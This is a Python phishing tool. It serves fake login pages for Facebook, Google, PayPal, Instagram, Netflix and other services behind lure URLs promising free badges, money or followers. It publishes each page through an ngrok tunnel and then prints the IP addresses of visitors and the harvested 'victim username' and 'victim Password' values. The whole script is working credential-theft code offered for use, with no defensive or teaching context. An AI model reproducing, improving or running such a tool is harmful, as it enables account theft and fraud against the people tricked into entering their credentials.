import os,json,time
blue= '\33[94m'
lightblue = '\033[94m'
a="                  "+lightblue+"Author: ABIR HOSSAIN"
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
os.system("chmod +x Abir/ngrok*")
os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
os.system("killall php> /dev/null 2>&1")
os.system("lolcat /A-PHIS.py")
def setup_site(website):
	os.system("clear")
main_opt=str(input(red+"\n[>] Select Your Option : "+yellow))

if main_opt=="01" or main_opt=="1":
	website="facebook"
	mask='http://blue-verified-badge-for-facebook-free'
elif main_opt=="2" or main_opt=="02":
	website="github"
	mask='http://get-blue-badge-on-twitter-free'
elif main_opt=="3" or main_opt=="03":
	website="instagram"
	mask='http://get-unlimited-followers-for-instagram'
elif main_opt=="4" or main_opt=="04":
	website="google"
	mask='http://get-unlimited-google-drive-free'
elif main_opt=="5" or main_opt=="05":
	website="gitlab"
	mask='http://gitlab-sinup'
elif main_opt=="6" or main_opt=="06":
	website="spotify"
	mask='http://get-a-premium-plan-for-spotify-free'
elif main_opt=="7" or main_opt=="07":
	website="netflix"
	mask='http://upgrade-your-netflix-plan-free'
elif main_opt=="8" or main_opt=="08":
	website="tiktok"
	mask='http://tiktok-free-liker'
elif main_opt=="9" or main_opt=="09":
	website="yahoo"
	mask='http://grab-mail-from-anyother-yahoo-account-free'
elif main_opt=="10":
	website="paypal"
	mask='http://get-500-usd-free-to-your-acount'
elif main_opt=="11":
	website="snapchat"
	mask='http://view-locked-snapchat-accounts-secretly'
elif main_opt=="12":
	website="wordprees"
	mask='https://wordprees-login-panel'
elif main_opt=="13":
	os.system("python phis.py")
else:
	os.system("python phis.py")
setup_site(website)
os.system("clear")
os.system("lolcat /phislogo.py")
print(a)
print()
print(""+green+"plz wait  few seconde and  on your hotspot else its well not work")
print()
print("                  "+yellow+"your phising is started>>>>>>>>")
os.system("cd site/"+website+"/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
print()
print("                         "+cyan+"ngrok start")
print()
print(""+lightblue+"wait 10 seconde ")
time.sleep(1)
print(""+lightblue+"wait 9 seconde ")
time.sleep(1)
print(""+lightblue+"wait 8 seconde ")
time.sleep(1)
print(""+lightblue+"wait 7 seconde ")
time.sleep(1)
print(""+lightblue+"wait 6 seconde ")
time.sleep(1)
print(""+lightblue+"wait 5 seconde ")
time.sleep(1)
print(""+lightblue+"wait 4 seconde ")
time.sleep(1)
print(""+lightblue+"wait 3 seconde ")
time.sleep(1)
print(""+lightblue+"wait 2 seconde ")
time.sleep(1)
print(""+lightblue+"wait 1 seconde ")
time.sleep(1)
print()
os.system("clear")
os.system("lolcat /phislogo.py")
print(a)
print()
os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
with open('tunnels.json') as data_file:    
    datajson = json.load(data_file)
msg = (""+green+"Your link is:"+blue+" ")
for i in datajson['tunnels']:
    msg = msg + i['public_url']+ '\n'+''+blue+'Your second link : '+yellow+''
os.system('clear')
print (msg)
while True:
	if os.path.isfile("site/"+website+"/ip.txt")==True:
		jop=open("site/"+website+"/ip.txt","r")
		ip2=jop.readline()
		ip=jop.readline().strip("IP:")
		print("\n [√]Someone Visited the Site ip address: "+ip)
		jop.close()
		os.system("rm -rf site/"+website+"/ip.txt")
	if os.path.isfile("site/"+website+"/usernames.txt")==True:
		abir=open("site/"+website+"/usernames.txt","r")
		Ah=abir.readline()
		start=int(Ah.find("Username:"))
		end=int(Ah.find("Pass:"))
		print("\t"+red+"victim username : "+Ah[start+9:end])
		print("\t"+red+"victim Password : "+Ah[end+5:])
		abir.close()
		os.system("rm -rf site/"+website+"/usernames.txt")
